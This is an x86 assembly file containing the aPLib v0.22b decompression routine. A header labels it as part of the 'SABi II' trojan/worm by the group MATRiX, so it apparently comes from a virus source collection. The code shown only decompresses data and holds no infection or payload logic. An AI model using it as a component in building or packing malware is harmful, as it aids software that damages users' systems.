   ; Trojan/I-Worm/Palm/Wm/W32.SABi¡ II
   ; 
   ; by: NBK & Ultras / MATRiX

;***************************************************************
;*         aPLib v0.22b  -  the smaller the better :)          *
;*               WASM & TASM assembler depacker                *
;*                                                             *
;*   Copyright (c) 1998-99 by  - Jibz -  All Rights Reserved   *
;***************************************************************

_aP_depack_asm2:
    push   ebp
    mov    ebp, esp
    pushad
    push   ebp

    mov    esi, [ebp + 8]     ; C calling convention
    mov    edi, [ebp + 12]

    cld
    mov    dl, 80h

literal2:
    movsb
nexttag2:
    call   getbit2
    jnc    literal2

    xor    ecx, ecx
    call   getbit2
    jnc    codepair2
    xor    eax, eax
    call   getbit2
    jnc    shortmatch2
    mov    al, 10h
getmorebits2:
    call   getbit2
    adc    al, al
    jnc    getmorebits2
    jnz    domatch_with_inc2
    stosb
    jmp    short nexttag2
codepair2:
    call   getgamma_no_ecx2
    dec    ecx
    loop   normalcodepair2
    mov    eax,ebp
    call   getgamma2
    jmp    short domatch2

shortmatch2:
    lodsb
    shr    eax, 1
    jz     donedepacking2
    adc    ecx, 2
    mov    ebp, eax
    jmp    short domatch2

normalcodepair2:
    xchg   eax, ecx
    dec    eax
    shl    eax, 8
    lodsb
    mov    ebp, eax
    call   getgamma2
    cmp    eax, 32000
    jae    domatch_with_2inc2
    cmp    eax, 1280
    jae    domatch_with_inc2
    cmp    eax, 7fh
    ja     domatch2

domatch_with_2inc2:
    inc    ecx

domatch_with_inc2:
    inc    ecx
domatch2:
    push   esi
    mov    esi, edi
    sub    esi, eax
    rep    movsb
    pop    esi
    jmp    short nexttag2

getbit2:
    add     dl, dl
    jnz     stillbitsleft2
    mov     dl, [esi]
    inc     esi
    adc     dl, dl
stillbitsleft2:
    ret

getgamma2:
    xor    ecx, ecx
getgamma_no_ecx2:
    inc    ecx
getgammaloop2:
    call   getbit2
    adc    ecx, ecx
    call   getbit2
    jc     getgammaloop2
    ret

donedepacking2:
    pop    ebp
    sub    edi, [ebp + 12]
    mov    [ebp - 4], edi     ; return unpacked length in eax

    popad
    pop    ebp
    ret    (4*2)
